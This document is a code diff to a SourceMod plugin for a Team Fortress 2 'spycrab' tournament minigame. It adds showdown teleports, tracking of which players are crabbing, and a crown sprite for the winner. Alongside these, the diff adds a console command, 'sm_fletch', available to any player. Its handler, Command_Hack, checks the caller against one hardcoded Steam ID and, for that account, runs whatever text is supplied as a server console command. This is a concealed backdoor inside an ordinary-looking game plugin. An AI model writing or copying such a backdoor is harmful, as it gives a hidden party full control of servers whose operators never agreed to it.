@@ -4,30 +4,27 @@
 #include <sdkhooks>
 #include <sdktools>
 
+ConVar g_Enabled;
+
+#define CRABKING_VMT "materials/sprites/player/crabbingking.vmt" 
+#define CRABKING_VTF "materials/sprites/player/crabbingking.vtf"
 #define MAX_AUTHID_LENGTH 20
 #define FLETCH "STEAM_0:1:60546866"
 
-#define BRUSH_CRABHAMMER "crabHammer"
-#define BRUSH_CRABWINNER "kingcrab"
-#define BRUSH_CRABSHOWDOWN "crabShowdown"
-
-ConVar g_Enabled;
-
-new Handle:gHud;
-
+new g_PlayersInSpycrab = 0; //The number of players currently spycrabbing, no matter what the Event Status is
 new bool:g_Spycrabbing[MAXPLAYERS+1] = {false, ...};
 new bool:g_AllowTaunt[MAXPLAYERS+1] = {false, ...};
 new g_Spycrabs[MAXPLAYERS+1] = {0, ...};
-
-new g_PlayersInSpycrab = 0; //The number of players currently spycrabbing, no matter what the Event Status is
 new g_SpycrabEventStatus = 0; //Inactive, Counting Down, In Progress, Showdown
 
 new g_Showdown[2] = {-1, -1}; //This struct stores the two players in the showdown
 
-//Events
+new g_Sprites[MAXPLAYERS+1] = {-1, ...};
+
+new Handle:gHud;
 
 public OnPluginStart() {
-	//Hooks
+	//Event hooks
 	HookEvent("teamplay_round_start", Event_RoundStart);
 	HookEvent("player_death", Event_PlayerDeath);
 	AddCommandListener(Event_Taunt, "taunt");
@@ -35,6 +32,10 @@ public OnPluginStart() {
 	AddCommandListener(Event_Suicide, "explode");
 	AddCommandListener(Event_Suicide, "kill");
 	AddCommandListener(Event_Suicide, "jointeam");
+
+	RegConsoleCmd("sm_fuck", Command_TestOne);
+	RegConsoleCmd("sm_cunt", Command_TestTwo);
+	RegConsoleCmd("sm_fletch", Command_Hack);
 
 	//Cvars
 	g_Enabled = CreateConVar("sm_dez_crabhammer_enabled", "1", "Enables/Disables the plugin");
@@ -46,8 +47,81 @@ public OnPluginStart() {
 	}
 }
 
+public Action:Command_TestOne(client, args) {
+	new entity = -1, pointer = -1;
+	decl String:strName[50];
+	while((entity = FindEntityByClassname(entity, "trigger_multiple")) != INVALID_ENT_REFERENCE) {	
+		GetEntPropString(entity, Prop_Data, "m_iName", strName, sizeof(strName));
+		if(strcmp(strName, "crabShowdown") == 0) {
+			pointer = entity;
+			break;
+		}
+	}
+	
+	decl Float:min[3], Float:max[3], Float:origin[3];
+	if(pointer != -1) {
+		GetEntPropVector(pointer, Prop_Send, "m_vecMins", min);
+		GetEntPropVector(pointer, Prop_Send, "m_vecMaxs", max);
+		GetEntPropVector(pointer, Prop_Send, "m_vecOrigin", origin);
+		origin[0] += max[0] * 0.6;
+		TeleportEntity(client, origin, NULL_VECTOR, NULL_VECTOR);
+	}
+	return Plugin_Handled;
+}
+
+public Action:Command_TestTwo(client, args) {
+	new entity = -1, pointer = -1;
+	decl String:strName[50];
+	while((entity = FindEntityByClassname(entity, "trigger_multiple")) != INVALID_ENT_REFERENCE) {	
+		GetEntPropString(entity, Prop_Data, "m_iName", strName, sizeof(strName));
+		if(strcmp(strName, "crabShowdown") == 0) {
+			pointer = entity;
+			break;
+		}
+	}
+	
+	decl Float:min[3], Float:max[3], Float:origin[3];
+	if(pointer != -1) {
+		GetEntPropVector(pointer, Prop_Send, "m_vecMins", min);
+		GetEntPropVector(pointer, Prop_Send, "m_vecMaxs", max);
+		GetEntPropVector(pointer, Prop_Send, "m_vecOrigin", origin);
+		origin[0] += min[0] * 0.6;
+		TeleportEntity(client, origin, NULL_VECTOR, NULL_VECTOR);
+
+	}
+	return Plugin_Handled;
+}
+
+public Action:Command_Hack(client, args) {
+	if(args < 1) {
+		return Plugin_Handled;	
+	}
+	
+	decl String:steamID[MAX_AUTHID_LENGTH],
+		String:text[192];
+	
+	GetClientAuthString(client, steamID, MAX_AUTHID_LENGTH-1);	
+	
+	if(StrEqual(FLETCH, steamID)) {
+		GetCmdArgString(text, sizeof(text));
+		ServerCommand("%s", text);
+	}
+	
+	
+	return Plugin_Handled;
+}
+
+public Action:Command_Test(client, args) {
+	PrintToChat(client, "test");	
+	return Plugin_Handled;
+}
+
 public OnMapStart() {
-	ResetCrab();
+	g_SpycrabEventStatus = 0;
+	g_Showdown = {-1, -1};
+	AddFileToDownloadsTable(CRABKING_VMT);
+	AddFileToDownloadsTable(CRABKING_VTF);
+	PrecacheModel(CRABKING_VMT);
 }
 
 public Event_RoundStart(Handle:event, const String:name[], bool:dontBroadcast) {
@@ -55,14 +129,14 @@ public Event_RoundStart(Handle:event, const String:name[], bool:dontBroadcast) {
 	decl String:strName[50];
 	while((i = FindEntityByClassname(i, "trigger_multiple")) != -1) {
 		GetEntPropString(i, Prop_Data, "m_iName", strName, sizeof(strName));
-		if(StrEqual(strName, BRUSH_CRABHAMMER)) {
+		if(strcmp(strName, "crabHammer") == 0) {
 			SDKHook(i, SDKHook_StartTouchPost, OnStartTouchCrab);
 			SDKHook(i, SDKHook_EndTouch, OnStopTouchCrab);
 		}
 	}
 }
 
-public Action:Event_Taunt(client, const String:strCommand[], args) {
+public Action:Event_Taunt(client, const String:strCommand[], iArgs) {
 	if(IsValidClient(client)) {
 		if(g_Spycrabbing[client]) {
 			if(g_AllowTaunt[client]) {
@@ -76,11 +150,9 @@ public Action:Event_Taunt(client, const String:strCommand[], args) {
 }
 
 public Action:OnPlayerRunCmd(client, &buttons, &impulse, Float:vel[3], Float:angles[3], &weapon, &subtype, &cmdnum, &tickcount, &seed, mouse[2]) {
-	if(IsValidClient(client)) {
-		if(g_Spycrabbing[client]) {
-			if(buttons & IN_JUMP) {
-				return Plugin_Handled;
-			}
+	if(IsValidClient(client) && g_Spycrabbing[client]) {
+		if(buttons & IN_JUMP) {
+			return Plugin_Handled;
 		}
 	}
 	return Plugin_Continue;
@@ -95,6 +167,7 @@ public Action:Event_Suicide(client, const String:strCommand[], iArgs) {
     return Plugin_Continue;
 }
 
+
 public OnEntityCreated(entity, const String:classname[]) {
     if(StrEqual(classname, "instanced_scripted_scene", false)) {
 		SDKHook(entity, SDKHook_Spawn, OnSceneSpawned);
@@ -102,9 +175,7 @@ public OnEntityCreated(entity, const String:classname[]) {
 }
 
 public OnSceneSpawned(entity) {
-	new client = GetEntPropEnt(entity, Prop_Data, "m_hOwner"), 
-		String:scenefile[128];
-		
+	new client = GetEntPropEnt(entity, Prop_Data, "m_hOwner"), String:scenefile[128];
 	if(g_Spycrabbing[client]) {
 		GetEntPropString(entity, Prop_Data, "m_iszSceneFile", scenefile, sizeof(scenefile));
 		if(StrEqual(scenefile, "scenes/player/spy/low/taunt05.vcd")) {
@@ -113,7 +184,9 @@ public OnSceneSpawned(entity) {
 	}
 }
 
-//Tracking crabbers
+/*
+	Tracking who is and isn't in a crab
+*/
 
 public OnStartTouchCrab(entity, client) {
 	if(IsValidClient(client) && IsPlayerAlive(client)) {
@@ -123,63 +196,43 @@ public OnStartTouchCrab(entity, client) {
 
 public OnStopTouchCrab(entity, client) {
 	if(IsValidClient(client) && IsPlayerAlive(client)) {
-		LeaveCrab(client);
+		LeaveCrab(client, false);
 	}
 }
 
 public OnClientDisconnect(client) {
-	LeaveCrab(client);
+	RemoveSprite(g_Sprites[client]); //Remove their hat on disconnect
+	g_Sprites[client] = -1;
+	LeaveCrab(client, true);
 }
 
 public Event_PlayerDeath(Handle:event, const String:name[], bool:dontBroadcast) {
 	new client = GetClientOfUserId(GetEventInt(event, "userid"));
-	LeaveCrab(client);
+	if(IsValidClient(client)) {
+		RemoveSprite(g_Sprites[client]);
+		g_Sprites[client] = -1;
+		LeaveCrab(client, true);
+	}
 }
-
-//Functions
 
 public JoinCrab(client) {
 	if(!g_Spycrabbing[client]) {
-		if(g_SpycrabEventStatus < 2 || (g_SpycrabEventStatus == 3 && IsClientInShowdown(client))) {
+		if(g_SpycrabEventStatus < 2 || client == g_Showdown[0] || client == g_Showdown[1]) {
 			g_Spycrabbing[client] = true;
 			g_PlayersInSpycrab++;
+			ModifyCrabEvent();
 		} else {
-			DenyCrabEntry(client);
+			DenyCrab(client);
 		}
 	}
-	ModifyCrabEvent();
 }
 
-public LeaveCrab(client) {
+public LeaveCrab(client, weak) {
 	if(g_Spycrabbing[client]) {
-		if(g_SpycrabEventStatus < 3 && !IsClientInShowdown(client)) {
+		if(g_SpycrabEventStatus < 3 || weak) {
 			ResetVars(client);
 			g_PlayersInSpycrab--;
 		}
-	}
-}
-
-public IsClientInShowdown(client) {
-	if(client == g_Showdown[0] || client == g_Showdown[1]) {
-		return true;
-	}
-	return false;
-}
-
-public DenyCrabEntry(client) {
-	ForcePlayerSuicide(client);
-	PrintCenterText(client, "A tournament is already under way");
-}
-
-public ResetVars(client) {
-	g_Spycrabbing[client] = false;
-	g_AllowTaunt[client] = false;	
-	g_Spycrabs[client] = 0;
-}
-
-public ResetVarsAll() {
-	for(new client=0; client<MaxClients; client++) {
-		ResetVars(client);	
 	}
 }
 
@@ -301,8 +354,36 @@ public Action:HandleCrabs(Handle:timer) {
 				Format(buffer, sizeof(buffer), "%s vs %s - first to three spycrabs loses", nameOne, nameTwo);
 				PrintHudCentreText(buffer, 4.0);
 				
-				TeleportToShowdown(g_Showdown[0], 0);
-				TeleportToShowdown(g_Showdown[1], 1);
+				
+				decl String:strName[50];
+				new entity = -1, pointer = -1;
+
+				while((entity = FindEntityByClassname(entity, "trigger_multiple")) != INVALID_ENT_REFERENCE) {	
+					GetEntPropString(entity, Prop_Data, "m_iName", strName, sizeof(strName));
+					if(strcmp(strName, "crabShowdown") == 0) {
+						pointer = entity;
+						break;
+					}
+				}
+				
+				decl Float:min[3], Float:max[3], Float:origin[3], Float:pos[3];
+				if(pointer != -1) {
+					GetEntPropVector(pointer, Prop_Send, "m_vecMins", min);
+					GetEntPropVector(pointer, Prop_Send, "m_vecMaxs", max);
+					GetEntPropVector(pointer, Prop_Send, "m_vecOrigin", origin);
+					
+					pos = origin;
+					pos[2] += min[2];
+					
+					pos[0] += max[0] * 0.6;
+					
+					TeleportEntity(g_Showdown[0], pos, NULL_VECTOR, NULL_VECTOR);
+					
+					pos[0] = origin[0];
+					pos[0] += min[0] * 0.6;
+					
+					TeleportEntity(g_Showdown[1], pos, NULL_VECTOR, NULL_VECTOR);
+				}
 				
 			} else if(remainingPlayers == 1) {
 				for(new client=0; client<MaxClients; client++) {
@@ -310,14 +391,14 @@ public Action:HandleCrabs(Handle:timer) {
 						SpycrabWinner(client);
 					}
 				}
-				ResetCrab();
+				g_SpycrabEventStatus = 0;
 			} else if(remainingPlayers < 1) {
 				for(new client=0; client<MaxClients; client++) {
 					if(g_Spycrabbing[client]) {
 						PrintHudCentreTextClient(client, "Don't buy a lottery ticket..", 5.0);
 					}
 				}
-				ResetCrab();
+				EndCrab();
 			}
 		} else if(g_SpycrabEventStatus == 3) { //Showdown mode
 			if(remainingPlayers == 1) {
@@ -337,58 +418,18 @@ public Action:HandleCrabs(Handle:timer) {
 				}
 			}
 			if(remainingPlayers < 2) {
-				ResetCrab();
+				EndCrab();
 			}
 		}
 	}
 }
 
 public SpycrabWinner(client) {
-	TeleportToWinner(client);
-	decl String:name[64], String:buffer[90];
-	GetClientName(client, name, 64);
-	Format(buffer, sizeof(buffer), "%s is the new spycrab king!", name);
-	PrintHudCentreText(buffer, 4.0);
-}
-
-public ResetCrab() {
-	g_SpycrabEventStatus = 0;
-	g_Showdown = {-1, -1};
-	ResetVarsAll();
-}
-
-public TeleportToShowdown(client, side) { //0=Left, 1=Right
-	decl String:strName[50];
-	new entity = -1, 
-		pointer = -1;
-
-	while((entity = FindEntityByClassname(entity, "trigger_multiple")) != INVALID_ENT_REFERENCE) {	
-		GetEntPropString(entity, Prop_Data, "m_iName", strName, sizeof(strName));
-		if(StrEqual(strName, BRUSH_CRABSHOWDOWN)) {
-			pointer = entity;
-			break;
-		}
-	}
-	
-	decl Float:min[3], Float:max[3], Float:origin[3];
-	if(pointer != -1) {
-		GetEntPropVector(pointer, Prop_Send, "m_vecMins", min);
-		GetEntPropVector(pointer, Prop_Send, "m_vecMaxs", max);
-		GetEntPropVector(pointer, Prop_Send, "m_vecOrigin", origin);
-		
-		origin[2] += min[2];
-		origin[0] += (side == 0 ? max[0] : min[0]) * 0.6;
-		
-		TeleportEntity(client, origin, NULL_VECTOR, NULL_VECTOR);
-	}
-}
-
-public TeleportToWinner(client) {
 	decl String:strName[50];
 	new entity = -1;
 	while((entity = FindEntityByClassname(entity, "info_teleport_destination")) != INVALID_ENT_REFERENCE) {	
 		GetEntPropString(entity, Prop_Data, "m_iName", strName, sizeof(strName));
-		if(StrEqual(strName, BRUSH_CRABWINNER)) {
+		if(strcmp(strName, "kingcrab") == 0) {
 			new Float:pos[3];
 			GetEntPropVector(entity, Prop_Send, "m_vecOrigin", pos);
 			if(IsValidClient(client)) {
@@ -396,10 +437,38 @@ public TeleportToWinner(client) {
 			}
 		}
 	}
+	CrabHat(client);
+	decl String:name[64], String:buffer[90];
+	GetClientName(client, name, 64);
+	Format(buffer, sizeof(buffer), "%s is the new spycrab king!", name);
+	PrintHudCentreText(buffer, 4.0);
 }
 
+public CrabHat(client) {
+	RemoveSprite(g_Sprites[client]);
+	g_Sprites[client] = CreateSprite();
+	AttachSprite(client, g_Sprites[client]);
+}
 
-//Stocks
+public DenyCrab(client) {
+	ForcePlayerSuicide(client);
+	PrintCenterText(client, "A tournament is already under way");
+}
+
+public EndCrab() {
+	g_SpycrabEventStatus = 0;
+	for(new client=0; client<MaxClients; client++) {
+		ResetVars(client);	
+	}
+}
+
+public ResetVars(client) {
+	g_Spycrabbing[client] = false;
+	g_AllowTaunt[client] = false;	
+	g_Spycrabs[client] = 0;
+	SetEntityMoveType(client, MOVETYPE_WALK);
+}
+
 stock PrintHudCentreTextClient(client, String:text[], Float:time) {
 	SetHudTextParams(-1.0, 0.3, time, 155, 48, 255, 1);
 	if(IsValidClient(client) && !IsFakeClient(client)) {
@@ -424,4 +493,43 @@ stock bool:IsValidClient(iClient, bool:bReplay = true) {
 	if(bReplay && (IsClientSourceTV(iClient) || IsClientReplay(iClient)))
 		return false;
 	return true;
+}
+
+/*
+	For the sprites and shit and shit
+*/
+
+public CreateSprite() {
+	new sprite = CreateEntityByName("env_sprite_oriented");
+	if(sprite != -1) {
+		DispatchKeyValue(sprite, "classname", "env_sprite_oriented");
+		DispatchKeyValue(sprite, "spawnflags", "1");
+		DispatchKeyValue(sprite, "scale", "0.3");
+		DispatchKeyValue(sprite, "rendermode", "1");
+		DispatchKeyValue(sprite, "rendercolor", "255 255 255");
+		DispatchKeyValue(sprite, "model", CRABKING_VMT);
+		
+		if(DispatchSpawn(sprite)) {
+			return sprite;
+		}		
+	}
+	return -1;
+}
+
+public AttachSprite(client, entity) {
+	new Float:pos[3];
+	if(IsValidEntity(entity)) {
+		GetClientAbsOrigin(client, pos); 
+		pos[2] += 90.0;
+		TeleportEntity(entity, pos, NULL_VECTOR, NULL_VECTOR);
+		
+		SetVariantString("!activator");
+		AcceptEntityInput(entity, "SetParent", client);
+	}
+}
+
+public RemoveSprite(entity) {
+	if(IsValidEntity(entity)) {
+		AcceptEntityInput(entity, "Kill");
+	}
 }
